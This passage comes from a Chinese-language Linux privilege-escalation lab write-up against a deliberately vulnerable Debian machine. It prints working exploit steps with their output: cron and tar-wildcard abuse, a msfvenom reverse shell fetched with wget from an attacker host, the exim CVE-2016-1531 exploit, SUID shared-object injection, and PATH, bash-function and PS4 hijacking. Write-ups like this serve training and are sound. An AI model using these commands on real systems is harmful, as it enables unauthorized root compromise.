+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>* * * * * root overwrite.sh
+</span></span><span style="display:flex;"><span>* * * * * root /usr/local/bin/compress.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user@debian:~$ vim overwrite.sh
+</span></span><span style="display:flex;"><span>user@debian:~$ chmod +x /home/user/overwrite.sh 
+</span></span><span style="display:flex;"><span>user@debian:~$ /tmp/rootbash -p
+</span></span><span style="display:flex;"><span>-bash: /tmp/rootbash: No such file or directory
+</span></span><span style="display:flex;"><span>user@debian:~$ /tmp/rootbash -p
+</span></span><span style="display:flex;"><span>rootbash-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h2 id="cron-job-通配符">cron job-通配符<a href="#cron-job-通配符" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>查看另一个cron-job</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ cat /usr/local/bin/compress.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
+</span></span><span style="display:flex;"><span>cd /home/user
+</span></span><span style="display:flex;"><span>tar czf /tmp/backup.tar.gz *
+</span></span></code></pre></div><p>主目录中使用通配符 (*) 运行 tar 命令</p>
+<p>好了在kali机中使用msfvenom生成shell</p>
+<p>​<code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.131.192 LPORT=4444 -f elf -o shell.elf</code>​</p>
+<p>使用wget到我们的目标主机</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ wget http://10.14.33.41:8089/shell.elf
+</span></span><span style="display:flex;"><span>--2022-12-17 09:35:13--  http://10.14.33.41:8089/shell.elf
+</span></span><span style="display:flex;"><span>Connecting to 10.14.33.41:8089... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">194</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: “shell.elf”
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>100%<span style="color:#f92672">[==================================================================================================================</span>&gt;<span style="color:#f92672">]</span> <span style="color:#ae81ff">194</span>         --.-K/s   in 0s  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022-12-17 09:35:14 <span style="color:#f92672">(</span>43.0 MB/s<span style="color:#f92672">)</span> - “shell.elf” saved <span style="color:#f92672">[</span>194/194<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>随后改变文件权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ chmod +x shell.elf 
+</span></span><span style="display:flex;"><span>user@debian:~$ touch /home/user/ --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>user@debian:~$ touch /home/user/--checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>user@debian:~$ touch /home/user/--checkpoint-action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>shell.elf
+</span></span></code></pre></div><p>随后</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm /home/user/shell.elf
+</span></span><span style="display:flex;"><span>rm /home/user/--checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>rm /home/user/--checkpoint-action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>shell.elf
+</span></span></code></pre></div><p>防止cron再次执行</p>
+<h1 id="0x7-suid--sgid">0x7 SUID / SGID<a href="#0x7-suid--sgid" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>在目标机中找到所有SUID/SGID可执行文件</p>
+<p>​<code>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ find / -type f -a <span style="color:#ae81ff">\(</span> -perm -u+s -o -perm -g+s <span style="color:#ae81ff">\)</span> -exec ls -l <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 2&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rwxr-sr-x <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">19528</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2011</span> /usr/bin/expiry
+</span></span><span style="display:flex;"><span>-rwxr-sr-x <span style="color:#ae81ff">1</span> root ssh <span style="color:#ae81ff">108600</span> Apr  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2014</span> /usr/bin/ssh-agent
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">37552</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2011</span> /usr/bin/chsh
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">168136</span> Jan  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> /usr/bin/sudo
+</span></span><span style="display:flex;"><span>-rwxr-sr-x <span style="color:#ae81ff">1</span> root tty <span style="color:#ae81ff">11000</span> Jun <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2010</span> /usr/bin/bsd-write
+</span></span><span style="display:flex;"><span>-rwxr-sr-x <span style="color:#ae81ff">1</span> root crontab <span style="color:#ae81ff">35040</span> Dec <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2010</span> /usr/bin/crontab
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">32808</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2011</span> /usr/bin/newgrp
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">168136</span> Jan  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> /usr/bin/sudoedit
+</span></span><span style="display:flex;"><span>-rwxr-sr-x <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">56976</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2011</span> /usr/bin/chage
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43280</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2011</span> /usr/bin/passwd
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">60208</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2011</span> /usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">39856</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2011</span> /usr/bin/chfn
+</span></span><span style="display:flex;"><span>-rwxr-sr-x <span style="color:#ae81ff">1</span> root tty <span style="color:#ae81ff">12000</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2011</span> /usr/bin/wall
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root staff <span style="color:#ae81ff">9861</span> May <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2017</span> /usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root staff <span style="color:#ae81ff">6883</span> May <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2017</span> /usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root staff <span style="color:#ae81ff">6899</span> May <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2017</span> /usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">963691</span> May <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> /usr/sbin/exim-4.84-3
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">6776</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2010</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">212128</span> Apr  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2014</span> /usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">10592</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2016</span> /usr/lib/pt_chown
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">36640</span> Oct <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2010</span> /bin/ping6
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34248</span> Oct <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2010</span> /bin/ping
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">78616</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2011</span> /bin/mount
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">34024</span> Feb <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2011</span> /bin/su
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">53648</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2011</span> /bin/umount
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">926536</span> Dec <span style="color:#ae81ff">17</span> 09:44 /tmp/rootbash
+</span></span><span style="display:flex;"><span>-rwxr-sr-x <span style="color:#ae81ff">1</span> root shadow <span style="color:#ae81ff">31864</span> Oct <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2011</span> /sbin/unix_chkpwd
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">94992</span> Dec <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2014</span> /sbin/mount.nfs
+</span></span></code></pre></div><p>-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3，在结果中，我们可用利用google、github、exploit.db找寻到利用方式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span> CVE-2016-1531 local root exploit
+</span></span><span style="display:flex;"><span>sh-4.1# 
+</span></span><span style="display:flex;"><span>sh-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h2 id="suid--sgid-可执行文件---共享对象注入">SUID / SGID 可执行文件 - 共享对象注入<a href="#suid--sgid-可执行文件---共享对象注入" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>/usr/local/bin/suid-so SUID 可执行文件容易受到共享对象注入的攻击</p>
+<p>首先我们执行<code>usr/local/bin/suid-so</code>​前它在退出前显示一个进度条</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ /usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>Calculating something, please wait...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[=====================================================================</span>&gt;<span style="color:#f92672">]</span> <span style="color:#ae81ff">99</span> %
+</span></span><span style="display:flex;"><span>Done.
+</span></span></code></pre></div><p>在文件上运行strace并在输出中搜索打开/访问调用和“没有这样的文件”错误：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;<span style="color:#ae81ff">1</span> | grep -iE <span style="color:#e6db74">&#34;open|access|no such file&#34;</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/suid-debug&#34;</span>, F_OK<span style="color:#f92672">)</span>         <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.preload&#34;</span>, R_OK<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.cache&#34;</span>, O_RDONLY<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/lib/libdl.so.2&#34;</span>, O_RDONLY<span style="color:#f92672">)</span>       <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/usr/lib/libstdc++.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/lib/libm.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">)</span>        <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/lib/libgcc_s.so.1&#34;</span>, O_RDONLY<span style="color:#f92672">)</span>    <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/lib/libc.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">)</span>        <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/home/user/.config/libcalc.so&#34;</span>, O_RDONLY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>可执行文件试图在我们的主目录中加载/home/user/.config/libcalc.so共享对象，但找不到。</p>
+<p>为 libcalc.so 文件创建.config目录：</p>
+<p><code>mkdir /home/user/.config</code></p>
+<p>可以在**/home/user/tools/suid/libcalc.c<strong>中找到示例共享对象代码。它只是生成一个 Bash shell。将代码编译到</strong>suid-so**可执行文件查找它的位置的共享对象中：</p>
+<p>​<code>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</code>​</p>
+<p>再次执行<strong>suid-so</strong>可执行文件，注意这次我们得到的不是进度条，而是 root shell。</p>
+<p>​<code>/usr/local/bin/suid-so</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ mkdir /home/user/.config
+</span></span><span style="display:flex;"><span>user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+</span></span><span style="display:flex;"><span>user@debian:~$ /usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>Calculating something, please wait...
+</span></span><span style="display:flex;"><span>bash-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h2 id="suid--sgid-可执行文件---环境变量">SUID / SGID 可执行文件 - 环境变量<a href="#suid--sgid-可执行文件---环境变量" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>/<strong>usr/local/bin/suid-env</strong>可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序。</p>
+<p>首先，执行文件并注意它似乎在尝试启动 apache2 网络服务器：</p>
+<p>​<code>/usr/local/bin/suid-env</code>​</p>
+<p>在文件上运行字符串以查找可打印字符的字符串：</p>
+<p>​<code>strings /usr/local/bin/suid-env</code>​</p>
+<p>一行（“service apache2 start”）表明正在调用服务可执行文件以启动网络服务器，但是未使用可执行文件的完整路径（/usr/sbin/service）。</p>
+<p>将位于 /home/user/tools/suid/service.c的代码编译成名为service的可执行文件。此代码只是生成一个 Bash shell：</p>
+<p>​<code>gcc -o service /home/user/tools/suid/service.c</code>​</p>
+<p>将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量，并运行 suid-env 可执行文件以获得根 shell：</p>
+<p>​<code>PATH=.:$PATH /usr/local/bin/suid-env</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@debian:~$ strings /usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
+</span></span><span style="display:flex;"><span>5q;Xq
+</span></span><span style="display:flex;"><span>__gmon_start__
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>setresgid
+</span></span><span style="display:flex;"><span>setresuid
+</span></span><span style="display:flex;"><span>system
+</span></span><span style="display:flex;"><span>__libc_start_main
+</span></span><span style="display:flex;"><span>GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>fff.
+</span></span><span style="display:flex;"><span>fffff.
+</span></span><span style="display:flex;"><span>l$ L
+</span></span><span style="display:flex;"><span>t<span style="color:#66d9ef">$(</span>L
+</span></span><span style="display:flex;"><span>|$0H
+</span></span><span style="display:flex;"><span>service apache2 start
+</span></span><span style="display:flex;"><span>user@debian:~$ gcc -o service /home/user/tools/suid/service.c
+</span></span><span style="display:flex;"><span>user@debian:~$ PATH<span style="color:#f92672">=</span>.:$PATH /usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>root@debian:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h2 id="suidsgid-可执行文件滥用-shell-特性1">SUID/SGID 可执行文件——滥用 Shell 特性（#1）<a href="#suidsgid-可执行文件滥用-shell-特性1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>/usr/local/bin/suid-env2 可执行文件与 /usr/local/bin/suid-env 相同，只是它 使用服务可执行文件 ( /usr/sbin/service) 的绝对路径来启动 apache2 网络服务器。</p>
+<p>用字符串验证这一点：</p>
+<p>​<code>strings /usr/local/bin/suid-env2&lt;br/&gt;</code>​</p>
+<p>在 Bash 版本 &lt;4.2-048中，可以使用类似于文件路径的名称定义 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。</p>
+<p>验证安装在 Debian VM 上的 Bash 版本是否低于 4.2-048：</p>
+<p>​<code>/bin/bash --version</code>​</p>
+<p>创建一个名为“ /usr/sbin/service ”的 Bash 函数，它执行一个新的 Bash shell（使用 -p 以保留权限）并导出该函数：</p>
+<p>​<code>function /usr/sbin/service { /bin/bash -p; }&lt;br/&gt;export -f /usr/sbin/service</code>​</p>
+<p>运行suid-env2可执行文件以获得 root shell：</p>
+<p>​<code>/usr/local/bin/suid-env2</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@debian:~# strings /usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
+</span></span><span style="display:flex;"><span>__gmon_start__
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>setresgid
+</span></span><span style="display:flex;"><span>setresuid
+</span></span><span style="display:flex;"><span>system
+</span></span><span style="display:flex;"><span>__libc_start_main
+</span></span><span style="display:flex;"><span>GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>fff.
+</span></span><span style="display:flex;"><span>fffff.
+</span></span><span style="display:flex;"><span>l$ L
+</span></span><span style="display:flex;"><span>t<span style="color:#66d9ef">$(</span>L
+</span></span><span style="display:flex;"><span>|$0H
+</span></span><span style="display:flex;"><span>/usr/sbin/service apache2 start
+</span></span><span style="display:flex;"><span>root@debian:~# /bin/bash --version
+</span></span><span style="display:flex;"><span>GNU bash, version 4.1.5<span style="color:#f92672">(</span>1<span style="color:#66d9ef">)</span>-release <span style="color:#f92672">(</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Free Software Foundation, Inc.
+</span></span><span style="display:flex;"><span>License GPLv3+: GNU GPL version <span style="color:#ae81ff">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span style="display:flex;"><span>This is free software; you are free to change and redistribute it.
+</span></span><span style="display:flex;"><span>There is NO WARRANTY, to the extent permitted by law.
+</span></span><span style="display:flex;"><span>root@debian:~# <span style="color:#66d9ef">function</span> /usr/sbin/service <span style="color:#f92672">{</span> /bin/bash -p; <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>root@debian:~# export -f /usr/sbin/service
+</span></span><span style="display:flex;"><span>root@debian:~# /usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>root@debian:~# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h2 id="suid--sgid-可执行文件滥用-shell-特性2">SUID / SGID 可执行文件——滥用 Shell 特性（#2）<a href="#suid--sgid-可执行文件滥用-shell-特性2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>注意：这不适用于 Bash 4.4 及更高版本。</p>
+<p>在调试模式下，Bash 使用环境变量<strong>PS4</strong>来显示调试语句的额外提示。</p>
+<p>在启用 bash 调试的情况下运行**/usr/local/bin/suid-env2**可执行文件，并将 PS4 变量设置为创建 SUID 版本 /bin/bash 的嵌入式命令：</p>
+<p>​<code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2</code>​</p>
+<p>使用 -p 运行 /tmp/rootbash 可执行文件以获得以 root 权限运行的 shell：</p>
+<p>​<code>/tmp/rootbash -p</code>​</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@debian:~# env -i SHELLOPTS<span style="color:#f92672">=</span>xtrace PS4<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)&#39;</span> /usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/usr/sbin/service apache2 start
+</span></span><span style="display:flex;"><span>basename /usr/sbin/service
+</span></span><span style="display:flex;"><span>VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;service ver. 0.91-ubuntu1&#39;</span>
+</span></span><span style="display:flex;"><span>basename /usr/sbin/service
+</span></span><span style="display:flex;"><span>USAGE<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]&#39;</span>
+</span></span><span style="display:flex;"><span>SERVICE<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>ACTION<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>SERVICEDIR<span style="color:#f92672">=</span>/etc/init.d
+</span></span><span style="display:flex;"><span>OPTIONS<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">2</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span>cd /
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">2</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> in
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z <span style="color:#e6db74">&#39;&#39;</span> -a <span style="color:#ae81ff">2</span> -eq <span style="color:#ae81ff">1</span> -a apache2 <span style="color:#f92672">=</span> --status-all <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">2</span> -eq <span style="color:#ae81ff">2</span> -a start <span style="color:#f92672">=</span> --full-restart <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span>SERVICE<span style="color:#f92672">=</span>apache2
+</span></span><span style="display:flex;"><span>shift
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> <span style="color:#ae81ff">1</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#e6db74">&#39;]&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>1<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> in
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;[&#39;</span> -z apache2 -a <span style="color:#ae81ff">1</span> -eq <span style="color:#ae81ff">1</span> -a start <span style="color:#f92672">=</span> --status-all <span style="color:#e6db74">&#39;]&#39;</span>
